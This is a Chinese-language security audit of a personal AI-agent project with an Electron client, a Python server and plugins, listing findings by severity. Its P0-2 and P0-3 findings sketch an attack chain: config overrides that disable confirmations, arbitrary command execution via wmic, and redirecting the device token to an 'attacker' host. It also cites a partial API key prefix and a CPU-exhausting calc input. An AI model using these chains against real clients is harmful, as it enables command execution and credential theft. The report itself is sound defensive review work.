> 审查方式：4 个并行深挖（brain 核心 / Electron 客户端 / 附属四子项目 / 测试与部署体系）+ 主审独立抽查。

## 二、安全硬伤（按严重度，全部带证据）

### P0-1 未入库的明文真实 API key（泄露扫描盲区）
- `deploy/test_cloud_api.py:8`：`API_KEY = "sk-npax…"`（硅基流动，真实形态，主审已读原文）。
- 该文件 **git untracked**（`git ls-files --error-unmatch` 确认不在库），因此 `tests/test_no_real_info_in_repo.py` 等防泄露测试（只扫 `git ls-files`）**扫不到它**。
- 同类：`admin/_cdp_app.js:21-22` 硬编码云 IP + 真 brain_token（被 .gitignore:223 挡住未泄库，但本地明文）；`brain/config/config.json` 明文存 4 个密钥（含两个 LLM api_key + brain_token）。
- **动作：删该文件、轮换硅基 key、把泄露扫描扩展到 untracked 文件。**

### P0-2 客户端完整提权链（渲染层可自拆全部护栏）
根因：`client/electron/main.js:1156` 的 `cfg:set` handler **无字段白名单**，patch 任意键直接合并进 config.json（写入逻辑 `main.js:267-280`，`{...readCfg(), ...patch}` 直展）。而所有护栏都是配置项：

```
插件 JS / XSS（来源：服务端下发的插件前端 main.js:944-975 executeJavaScript；
  或 pages.js:129 job_id 属性注入；或缺 will-navigate 的导航劫持）
  → vigil.cfg.set({localAuto:true})                        // main.js:1156 无白名单
  → 危险工具确认气泡被整体跳过（main.js:1021-1024）
  → vigil.cfg.set({allowAllPaths:true, allowAllCmds:true})  // localtool.js:158 / :865 全放开
  → vigil.local.run('local_exec', ...)                      // 无确认任意命令执行
  或：
  → vigil.cfg.set({connection_mode:'remote', remote_base:'http://attacker/'})  // main.js:756-763 任意 origin 接受
  → vigil.api(...) 带上 getToken() 设备 token 发出（main.js:1100-1104）          // 凭据外传
```

讽刺的是 `main.js:1068-1073` 的注释显示团队亲手堵过 'api' 通道的同类漏洞（渲染层传任意 base 外传 token）——只堵了一个入口，没堵 cfg 入口。

### P0-3 命令白名单的"只读"承诺不成立
- `client/electron/localtool.js:811`：`wmic` 在只读白名单里 → `wmic process call create "任意命令"` 直接拉进程（CMD_BLOCK `:819-824` 不含它；execVerdict `:854-873` 只查前缀 + shell 元字符）。主审已读原文确认。
- `type`/`find`/`findstr`/`where` 接受任意路径参数 → 可读白名单外任意文件，路径 guard 在 exec 路径上完全不生效。
- 准确表述：local_exec 本身 `danger:true`（`:1043`）且默认关闭（DEFAULT_OFF `:1056`），每次调用有确认气泡——所以这不是"无确认 RCE"，而是**白名单语义失真 + 与 P0-2 的 localAuto 组合成 RCE + 用户对"只读命令"的确认习惯被利用**。

### P1 级（按序）
1. **`/api/sync/*` 推送口对 device token 开放**：`server.py:215` `DEVICE_POST_PREFIX = ("/api/sync/",)`，`_sync_route_post`（`:1057`）直接 upsert 记忆/覆盖人设，无管理员检查。一台手机/桌宠 token 泄露 = 可往云记忆库灌数据。
2. **`shell:open` 无协议白名单**：`main.js:1241` `shell.openExternal(String(url||''))`，file:// / ms-settings: 等任意协议可达；对照 localtool.js:411 自己的 open_url 都校验 `^https?://`。
3. **无 `will-navigate` 防护**：两窗口只有 setWindowOpenHandler（`main.js:607-609`、`675-677`），file:// 页导航远程 URL 后 preload 重执行、`window.vigil` 重新暴露。
4. **异常文本直回客户端**：`server.py:3081`（及 :3096、:1824）`self._json(500, {"err": f"{type(e).__name__}: {e}"})`，内部异常消息可能含路径/上游地址泄给已认证调用方。
5. **HTTP 层无读超时（DoS 面）**：`_Handler` 无 timeout，`self.rfile.read(n)`（`:1875`）可被慢发连接永久阻塞；ThreadingHTTPServer 每连接一线程无上限 → 线程耗尽整个 API 瘫痪。聊天锁有 300s 超时，HTTP 读没有。
6. **calc 幂运算爆炸**：`plugins/calc.py:26-31` 白名单正则允许 `9^9^9`（源码里 `^` 还会被替换成 `**`），eval 计算 9^387420489，模型可控参数 → 占满 CPU/内存数分钟。
7. **插件零隔离（设计自认）**：admin token = 安装插件 = RCE；且插件自身 ROUTES handler 无自校验（如 plugin_market 的 install/uninstall，`plugins/plugin_market.py:191-196`），门全在 server 一处。
8. **云单点纯 HTTP**：四端（pet/App/桥接/admin）全汇 `<云机IP>:8788` 无 TLS；wechat-bridge token 仍拼 URL query（`wxauto_bridge.py:376-378`，会进日志）。
9. **deploy 侧 AutoAddPolicy ×26**：`deploy/*.py` 首次连接自动接受未知 host key，云机是公网 IP，MITM 面。
10. **执行期不查能力开关**：`localtool.js:1077-1089` 的 run() 与 `main.js:1016-1039` 都不查 `cfg.localOff`/`localRisky`，设置里关掉的工具 IPC/插件 JS 仍可直跑。

## 三、架构与代码质量薄弱点

### brain
- **不是 FastAPI**：全仓 grep `fastapi|flask|uvicorn` 零命中；`server.py:19` 只有 stdlib `http.server`，60 个 `if path ==` 分支手搓路由（`:1828-3073`）。README 与目录说明均宣称 FastAPI——文档与代码的事实性偏差。
- **静默吞异常 12 处**（`brain.py:536/790/812/913/925/932/940/1145/1282/1418` 等 `except Exception: pass`），其中 4 处关键：记忆同步写失败、历史挂载失败、人设 apply 失败、技能宿主拉起失败——全部无声。同类：`agenda.py` 的 parse_agenda_item 解析失败静默丢弃（日期约定丢了无提示）。
- **persona_store 非原子写**：`persona_store.py:802` 裸 `open(p,"w")`，与 memory_store_v2 的 tmp+rename 原子写纪律不一致，崩溃留半截人设文件。
- **registry 竞态**：`plugin_host.py:514` `for q in _registry.values()` 无锁无快照，与 reload 的 `_registry.clear()`（`:291`）并发可抛 RuntimeError。
- **持锁跑网络**：`memory_store_v2.py:1403/1442` retrieve()/render() 在 `@_synchronized` 内调 embed_texts（`:1417`），违反本文件自定的"网络调用不进锁"纪律（`:771-772`）；云端 embed 超时 30s 期间后台写全堵。
- **功能开关可被绕过**：`tools.py:448-501` invoke_spec 执行层不复查 feature 开关——模型从历史/幻觉产出已被关的工具名照样执行（插件工具有 `_enabled` 过滤，内置 weather/tracking 没有）。
- **planner 线上不走**：`planner.py:125` `enabled()` 默认 False，`:351` plan() 首行没开就返回 None——README"P2 Agent 执行循环已实现"与实际默认关闭之间有距离；且 `execute_plan`（`:391-426`）无总体时间预算（5 步 × 300s 远超 CHAT_LOCK 300s）。
- **唤醒式上下文加载从未接线**：`brain.py:1673-1680` 的懒加载路径只在重载人设时调，正常轮次不经过。
- **32 处硬编码 .json 路径**：gate/meme/websearch/skill/plugin_market/kb 直接拼自己目录，换 HOME 即丢数据。
- **半成品**：chat_mode=desktop（`server.py:406`，桌宠/PC 双开丢记忆）；ollama 本地流式 `NotImplementedError`（`model_providers/ollama.py:261`，"P1 未开放"）；creator 安装"扫描恶意代码"承诺未实现（`creator_install.py:31`）；creator 双实例竞争（`creator_jobs.py:116-123`）。
- **Codex 集成只挂 HTTP 面**：codex_adapter(1101)+codex_process(565)+codex_runtime(88) ≈ 1750 行，经 `server.py:1912-1913` handle_http 暴露给 agent-center，**不进模型工具表**（tools.py 无 codex）——模型用不了它，它是给人点的 API。（注：子代理报的"三份重复副本只接线一份"不准确，三者是分层模块，已改写。）

## 六、结论

这个项目的** Agent 内核（对话-工具-记忆-插件闭环）是真实且高质量的**：记忆污染拦截、插件派发、设备权限矩阵、本地操控执行器的 realpath/白名单工程、fail-closed 启动策略，都带着事故打磨的痕迹，不是玩具。测试（根目录 901 条）和 CI（Windows 真机安装验收）在这个量级的个人项目里超规格。

但它现在处在一个**危险的错配**里：核心安全模型假设"服务端可信、客户端拦危险操作"，而客户端恰恰有一个渲染层可写的安全策略入口（P0-2）、一份失真的只读白名单（P0-3）、和一个躺在 untracked 文件里的真实 key（P0-1）。同时，"林知夏/Vigil"改名迁移做了一半（立绘名/启动器路径/gate 副本），安卓被拆空后留下死结，文档停留在至少两个大版本之前。

一句话：**内核 85 分，安全边界 55 分，工程卫生 40 分。** 21 项修复里前 6 项都是小时级工作量，做完这个项目才配得上它的内核质量。
